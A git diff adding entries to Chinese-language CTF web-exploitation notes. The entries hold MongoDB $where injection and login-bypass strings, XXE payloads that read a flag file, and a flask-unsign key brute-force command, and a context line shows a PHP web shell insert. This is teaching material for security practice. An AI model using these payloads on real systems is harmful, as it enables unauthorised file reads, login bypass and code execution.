@@ -2190,3 +2190,86 @@ INSERT INTO lol.pwn (dataz) VALUES ("<?php system($_GET['cmd']); ?>");--
 ```
 在/tmp目录下创建一个连接至lol.php文件的数据库 。然后创建名为pwn的table，并往table里插入php代码。或者说往里面写了个shell。
 - 此题预期解是利用php的反序列化漏洞实现rce。另一种方法在[这里](https://spiky-enquiry-e91.notion.site/Secure-Hashed-DB-25aee784ba96429e8b07586d43ea7016)有提到。因为应用内部调用了file_get_contents，且参数可控。于是可直接控制参数为`php://input`,然后传post参数为想读取的文件即可。另外也有人提到可用[PHP FILTER CHAINS](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle)（[工具](https://github.com/synacktiv/php_filter_chains_oracle_exploit)）。不过这种解法会产生非常长的payload，有时候会引发服务器502.
+236. [Flag Shop](https://theromanxpl0it.github.io/ctf_hsctf2023/2023/06/12/flagshop.html)
+- mongo db Blind [NoSQL](https://www.talend.com/resources/sql-vs-nosql/) injection(python)
+    - [$where](https://www.mongodb.com/docs/manual/reference/operator/query/where/#mongodb-query-op.-where)注入：虽然是“nosql”，但是在不过滤用户输入，直接拼接参数的情况下也会引发注入。该子句用于`db.flags.find()`中，会执行任何传递给它的js代码。例：
+```py
+results = db.flags.find(
+{
+"$where": f"this.challenge.includes('{request.json['search']}')"
+}, {
+"_id": False,
+"flag": False
+})
+```
+此时可以尝试闭合实现注入。可以用分号注入多个句子：`'); this.flag.includes('flag{`，不过只有最后一个有效的条件会被执行，等于数据库实际查找的条件是`this.flag.includes('flag{`，忽略前面的`this.challenge.includes('')`。同理，也可用`&&`:`') && this.challenge.includes('flag')`。或者`||`:`'); 1==1 || this.challenge.includes('`。除了使用includes，还可使用`startsWith`:`') && this.flag.startsWith('`
+
+237. [png-wizard-v3](https://kos0ng.gitbook.io/ctfs/ctfs/write-up/2023/hsctf/web-exploitation#png-wizard-v3-8-solves)
+- svg文件相关Error-based XXE. 以下处理svg data的逻辑具有xxe漏洞：
+    ```py
+    svg_root=etree.parse(filename,parser=etree.XMLParser()).getroot()
+    drawing=SvgRenderer(filename).render(svg_root)
+    ```
+当用户输入的xxe payload在服务端无回显时（无法下载xxe payload渲染后的结果文件，服务器只返回渲染是否成功而没有成品等），使用Error-based XXE。详情见：https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/
+```xml
+<?xml version="1.1" standalone="no" ?>
+<!DOCTYPE svg  [
+    <!ENTITY % NUMBER '
+        <!ENTITY &#x25; file SYSTEM "file:///app/flag.txt">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+    '>
+    %NUMBER;
+]>
+<!--file://为任意不存在的路径-->
+<svg xmlns="http://www.w3.org/2000/svg" version="1.1"> <!--最后这一段不同题填的不同，写符合题目语境就好-->
+&a;
+</svg>
+```
+- 其他解法/unintended:
+    ```xml
+    <!--unintended-->
+    <?xml version="1.1"?>
+    <!DOCTYPE svg [
+        <!ENTITY xxe SYSTEM "/app/flag.txt">
+    ]>
+    <svg viewBox="0 0 1000 300" class="test">
+    <style>
+    .test {
+        width: &xxe;;
+    }
+    </style>
+    <text>EXPLOIT</text>
+    </svg>
+    ```
+    ```xml
+    <!--localdtd-->
+    <?xml version="1.0" standalone="yes"?>
+    <!DOCTYPE bruh [
+    <!ENTITY % localdtd SYSTEM "file:///usr/share/xml/docutils/docutils.dtd">
+    <!ENTITY % yesorno '
+    <!ENTITY &#x25; file SYSTEM "file:///app/flag.txt">
+    <!ENTITY &#x25; eval "
+    <!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///bruh/&#x25;file;&#x27;>">
+    &#x25;eval;
+    &#x25;error;
+    '>
+    %yesorno;
+    ]>
+    ```
+238. [mongodb](https://xhacka.github.io/posts/mogodb/)
+- mongodb/[no sql injection](https://nullsweep.com/a-nosql-injection-primer-with-mongo/)的绕过登录payload。例：
+    ```py
+    #https://security.stackexchange.com/questions/83231/mongodb-nosql-injection-in-python-code/83234#83234
+    user = db.users.find_one(
+        {
+        "$where":
+        f"this.user === '{request.form['user']}' && this.password === '{request.form['password']}'"
+        }
+    )
+    ```
+    - 用户名：`' == '`，密码为空
+    - 用户名与密码均为：`' || 'a'=='a`
+239. [Very Secure](https://xhacka.github.io/posts/Very-Secure/)
+- flask session secret key爆破：flask-unsign+字典。`flask-unsign --wordlist ./keys --cookie '' --unsign --no-literal-eval`。字典格式：每个key之间用`\n`分隔
